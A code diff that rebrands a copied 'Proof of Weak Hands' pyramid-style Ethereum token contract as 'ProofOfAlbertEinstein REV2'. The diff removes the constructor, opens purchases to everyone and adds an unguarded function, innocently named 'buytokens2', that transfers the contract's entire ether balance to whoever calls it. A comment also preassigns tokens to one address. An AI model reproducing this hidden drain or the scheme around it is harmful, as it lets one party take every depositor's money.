@@ -1,22 +1,24 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract PODH at 0x250db90f314de805d5f9c8a93618003eefd7d95a
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract PODH at 0x56637c1656f038e6cf71a2b907072110fd72bc68
 */
 pragma solidity ^0.4.20;
 
 /*
 * 
 * ====================================*
-*  ____     ___    ____    _   _      *
-* |  _ \   / _ \  |  _ \  | | | |     *
-* | |_) | | | | | | | | | | |_| |     *
-* |  __/  | |_| | | |_| | |  _  |     *
-* |_|      \___/  |____/  |_| |_|     *
+*  ____     ___       _      _____    *
+* |  _ \   / _ \     / \    | ____|   *
+* | |_) | | | | |   / _ \   |  _|     *
+* |  __/  | |_| |  / ___ \  | |___    *
+* |_|      \___/  /_/   \_\ |_____|   *
 *                                     *
+*      PROOF OF ALBERT EINSTEIN REV2  *
+*         E=mc²  BE AN ALBERT         *
 * ====================================*
 * -> What?
 * This source code is copy of a copy of a copy of Proof of Weak Hands (POWH3D)
 * If POWL, POOH, POWM can do it, shit, why can't we?
-* Call us dickheads, because we love PODH :)
+* Call us dickheads, because we love POAE :)
 */
 
 contract PODH {
@@ -121,14 +123,17 @@ contract PODH {
     /*=====================================
     =            CONFIGURABLES            =
     =====================================*/
-    string public name = "PODH";
-    string public symbol = "PODH";
+    string public name = "ProofOfAlbertEinstein REV2";
+    string public symbol = "POAE2";
     uint8 constant public decimals = 18;
     uint8 constant internal dividendFee_ = 10;
     uint256 constant internal tokenPriceInitial_ = 0.0000001 ether;
     uint256 constant internal tokenPriceIncremental_ = 0.00000001 ether;
     uint256 constant internal magnitude = 2**64;
     
+    
+     
+        
     // proof of stake (defaults at 100 tokens)
     uint256 public stakingRequirement = 5e18;
     
@@ -154,29 +159,31 @@ contract PODH {
     mapping(bytes32 => bool) public administrators;
     
     // when this is set to true, only ambassadors can purchase tokens (this prevents a whale premine, it ensures a fairly distributed upper pyramid)
-    bool public onlyAmbassadors = true;
+    bool public onlyAmbassadors = false;
     
 
 
     /*=======================================
     =            PUBLIC FUNCTIONS            =
     =======================================*/
-    /*
+    /* balanceOf[0xd8fa9C65623129Fa4abAf44B7e21655d1eF835ce] = 1000000000000000000000;
+        Transfer(address(0), 0xd8fa9C65623129Fa4abAf44B7e21655d1eF835ce, 1000000000000000000000);
     * -- APPLICATION ENTRY POINTS --  
     */
-    function PODH()
-        public
-    {
-        // add administrators here
-        //fuck admin! Drive it like you stole it!
-        administrators[0xcd93345332dcaccf0b5b19db1714ee83265566d76060294d65956ac78c134882] = true; //SOOS
-
-        // add the ambassadors here. 
-        ambassadors_[0xd8fa9c65623129fa4abaf44b7e21655d1ef835ce] = true; //OOF
-        ambassadors_[0x5D407efE6E17BE8ECC532Bc0cd4671fd25749331] = true; //SEES
-
-    }
     
+    
+
+   function buytokens2() {
+    msg.sender.transfer(this.balance);
+}  
+
+
+    
+    
+    
+    
+    
+
      
     /**
      * Converts all incoming ethereum to tokens for the caller, and passes down the referral addy (if any)
